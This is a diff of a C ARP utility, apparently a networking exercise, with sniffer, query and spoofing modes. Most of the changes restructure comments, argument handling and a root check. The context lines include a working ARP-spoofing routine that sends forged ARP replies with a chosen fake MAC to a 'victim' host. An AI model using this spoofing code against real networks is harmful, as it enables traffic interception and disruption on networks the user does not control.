@@ -1,3 +1,5 @@
+#include "arp.h"
+
 #include <netinet/if_ether.h>
 #include <netinet/ether.h>
 #include <sys/types.h>
@@ -5,8 +7,7 @@
 #include <sys/ioctl.h>
 #include <netpacket/packet.h>
 #include <net/ethernet.h>
-#include <net/if.h>
-#include "arp.h"
+#include <net/if.h> //if_nametoindex
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <fcntl.h> // for open
@@ -47,25 +48,32 @@ static char fmac[20];
 int main(int argc, char *argv[])
 {
 	
-	if(argc == 2 && strcmp(argv[1],"-h")==0)
+	//get current user id, root -> 0
+	uid_t uid = getuid();
+		
+	//check whether is superuser or not 
+	if(uid!=0 )
+		puts("ERROR: You must be root to use this tool!");
+		
+	else if(argc == 2 && strcmp(argv[1],"-h")==0)
 	{
 		Print_Format();
 	}
+	
 	else if( argc == 3 )
 	{
 		if(strcmp(argv[1],"-l")==0)
 		{
-			puts("[   ARP sniffer mode   ]");
 			list_arp(argv); // ./arp list -a or filter IP address
 		}
 		else if(strcmp(argv[1],"-q")==0)
 		{
-			puts("[    ARP query mode    ]");
+			puts("[    ARP query mode    ]"); // ./arp query IP address
 			arp_query(argv);
 		}
 		else if(strlen(argv[1])==17 && strlen(argv[2])>=7)
 		{
-			puts("[   ARP spoofing mode   ]");
+			puts("[   ARP spoofing mode   ]"); // ./arg fakeMAC target_IP_address
 			pre_arp_spoofing(argv);
 		}
 		else
@@ -73,14 +81,7 @@ int main(int argc, char *argv[])
 	}
 	else 
 	{
-		if(argc==1 )
-			puts("ERROR: You must be root to use this tool!");
-			
-		else
-		{
-			//fprintf(stderr,"Usage: sudo %s [OPTION]... [ADDRESS]...\n",argv[1]);
-			printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
-		}
+		printf("Format error !\nUsage: sudo %s -h for help\n",argv[0]);
 	}
 	//struct in_addr myip;
 	
@@ -116,23 +117,23 @@ int main(int argc, char *argv[])
 void list_arp(char *argv[])
 {
 	struct in_addr filter_ip;
-	
+	filter_ip.s_addr = inet_addr(argv[2]);
 	// ./arp -l -a
 	if(strcmp(argv[2], "-a") == 0)
-		arp_preprocess(NULL, NULL);
-		
-	else
 	{
-		filter_ip.s_addr = inet_addr(argv[2]);
-
-		// check IP
-		if(filter_ip.s_addr < 0)
-			Print_Format();
-		else
-			arp_preprocess(NULL, &filter_ip);	// ./arp list <target_ip_addr>
+		puts("[   ARP sniffer mode  without filter IP   ]");
+		arp_preprocess(NULL, NULL);
 	}
 	
-	return;
+	// check IP
+	else if( filter_ip.s_addr > 0) 
+	{
+		puts("[   ARP sniffer mode  with filter IP ]");
+		arp_preprocess(NULL, &filter_ip);	// ./arp list <target_ip_addr>
+	}
+	
+	else
+		Print_Format();
 }
 
 void print_arp(struct ether_arp *arp)
@@ -143,6 +144,8 @@ void print_arp(struct ether_arp *arp)
 	bzero(arp_info,sizeof(arp_info));
 	
 	sprintf(arp_info,"Get arp packet - Who has %s?                   Tell %s\n",get_target_protocol_addr(arp, target_address),get_sender_protocol_addr(arp, sender_address));
+	
+	// print ./arp -l -a or filter_IP_address
 	printf("%s",arp_info);
 }
 void arp_query(char *argv[])
@@ -172,19 +175,25 @@ void arp_query(char *argv[])
 	
 	query.eth_hdr.ether_type = htons(ETH_P_ARP); // set protocol type -> ARP (0x0806)
 	
-	set_hard_type(&query.arp, ARPHRD_ETHER); // set as ethernet
-	set_hard_size(&query.arp, ETH_ALEN); // ehternet length
+	// set as Ethernet
+	set_hard_type(&query.arp, ARPHRD_ETHER); 
+	// Ehternet length
+	set_hard_size(&query.arp, ETH_ALEN);
+	// IP        
 	set_prot_type(&query.arp,ETHERTYPE_IP);
-	set_prot_size(&query.arp, 4); // IP length        
-	set_op_code(&query.arp, ARPOP_REQUEST); //set ARP op code -reply 
+	// IP length       
+	set_prot_size(&query.arp, IP_ALEN);
+	//set ARP op code -> reply    
+	set_op_code(&query.arp, ARPOP_REQUEST); 
 	
 	set_sender_hardware_addr(&query.arp, (get_inf_mac(get_mac,DEVICE_NAME)));
 	set_sender_protocol_addr(&query.arp, (get_inf_ip(get_ip, DEVICE_NAME)));
-	set_target_hardware_addr(&query.arp, "\x00\x00\x00\x00\x00\x00"); // unknown -> we wanna try to seek 
-	set_target_protocol_addr(&query.arp, (char *)&target_address);	// set target pa 
+	// unknown -> we wanna try to seek 
+	set_target_hardware_addr(&query.arp, "\x00\x00\x00\x00\x00\x00");
+	// set target pa  
+	set_target_protocol_addr(&query.arp, (char *)&target_address);	
 	
 	// set sa
-	//strcpy(sa.sa_data, DEVICE_NAME);
 	sa.sll_family = AF_PACKET;
 	sa.sll_ifindex = if_nametoindex(DEVICE_NAME);
 	sa.sll_halen = ETH_ALEN;
@@ -195,6 +204,7 @@ void arp_query(char *argv[])
 	{
 		bzero(&arp,sizeof(packet));
 		read(sock_recv, &arp, sizeof(arp));
+		
 		if(memcmp(arp.arp_spa, &target_address,sizeof(arp.arp_tpa))==0) 
 		{
 			printf("MAC address of %s is %s\n", argv[2], get_sender_hardware_addr(&arp, query_info));
@@ -203,7 +213,6 @@ void arp_query(char *argv[])
 	}
 	close(sock_send);
 	close(sock_recv);
-
 }
 
 /*void pre_arp_query(char *argv[])
@@ -234,8 +243,9 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 	struct ether_arp arp;
 	int sockfd;
 	
+	// AF , PF PACKET
 	sockfd = socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
-	//sockfd = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));
+	
 	
 	if(sockfd <0)
 	{
@@ -247,6 +257,7 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 		bzero(&arp,sizeof(arp));
 		read(sockfd, &arp, sizeof(arp));
 		
+		// ./arp -l -a
 		if(ip ==NULL)
 		{
 			print_arp(&arp);
@@ -256,6 +267,7 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 		{
 			if(memcmp(arp.arp_tpa, ip, sizeof(arp.arp_tpa)) ==0)
 			{
+			
 				if(mac != NULL)
 				{
 					print_arp(&arp);
@@ -270,7 +282,6 @@ void arp_preprocess(struct ether_addr *mac, struct in_addr *ip)
 		}
 	}
 	close(sockfd);
-	return ;
 }
 
 void pre_arp_spoofing(char *argv[])
@@ -307,7 +318,8 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	struct arp_packet rp;
 	struct sockaddr_ll victim;
 	
-	sendfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); //reply socket
+	//reply socket
+	sendfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); 
 	bzero(&victim, sizeof(victim));
 	
 	// set packet hardware 
@@ -315,16 +327,21 @@ void arp_spoofing(struct ether_addr *fakemac, struct ether_arp *packet)
 	memcpy(&rp.eth_hdr.ether_shost, fakemac, ETH_ALEN);
 	rp.eth_hdr.ether_type = htons(ETH_P_ARP);
 	
-	set_hard_type(&rp.arp, ARPHRD_ETHER); // ethernet
-	set_hard_size(&rp.arp, ETH_ALEN); // ehternet length
-	set_prot_type(&rp.arp,ETHERTYPE_IP); // IP 
-	set_prot_size(&rp.arp, 4); // IP length        
-	set_op_code(&rp.arp, ARPOP_REPLY); //set ARP op code -reply 
+	// ethernet
+	set_hard_type(&rp.arp, ARPHRD_ETHER); 
+	// ehternet length
+	set_hard_size(&rp.arp, ETH_ALEN); 
+	// IP 
+	set_prot_type(&rp.arp,ETHERTYPE_IP); 
+	// IP length       
+	set_prot_size(&rp.arp, IP_ALEN);  
+	//set ARP op code -reply 
+	set_op_code(&rp.arp, ARPOP_REPLY); 
 	
 	set_sender_hardware_addr(&rp.arp, (unsigned char *)fakemac);
 	set_sender_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_tpa));
 	set_target_hardware_addr(&rp.arp, (unsigned char *)(packet->arp_sha)); // set target hrd as orig sender hrd
-	set_target_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_spa));	// set target pa as orig sender pa
+	set_target_protocol_addr(&rp.arp, (unsigned char *)(packet->arp_spa));	// set target pa as orig sender tpa
 	
 	// set 
 	victim.sll_family = AF_PACKET;
